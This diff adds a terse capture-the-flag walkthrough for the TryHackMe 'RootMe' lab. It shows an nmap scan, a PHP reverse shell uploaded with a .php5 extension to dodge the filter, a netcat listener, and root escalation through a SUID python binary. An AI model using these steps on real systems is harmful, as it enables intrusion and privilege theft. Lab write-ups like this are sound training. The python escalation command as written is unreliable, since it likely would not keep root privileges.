@@ -1,0 +1,57 @@
+----------------                               ------------------
+               :::::::::::;| ROOTME |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "ROOTME".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"Found ports: 22/SSH, 80/HTTP"
+"Website says 'Root me please!'"
+
+2. FIND UPLOAD VULN.
+
+    http://<ip>/upload/
+    "Lets upload files - try PHP shell!"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. UPLOAD SHELL.
+
+    rename php-reverse-shell.php to shell.php5
+    upload and access at http://<ip>/upload/files/shell.php5
+    nc -lvnp 4444
+    "GOT SHELL!"
+
+2. FIND USER FLAG.
+
+    find / -name user.txt 2>/dev/null
+    cat /var/www/user.txt
+
+----------TASK 2 COMPLETED-----------
+
+TASK - 3 (PRIV ESC - WWW-DATA TO ROOT)
+
+1. CHECK SUID.
+
+    find / -perm -4000 2>/dev/null
+    "/usr/bin/python has SUID bit - WTF?"
+
+2. EXPLOIT PYTHON.
+
+    /usr/bin/python -c 'import os; os.system("/bin/bash")'
+    "BOOM! ROOT SHELL!"
+
+FLAGS:
+    cat /root/root.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- ROOTME ROOTED ----------
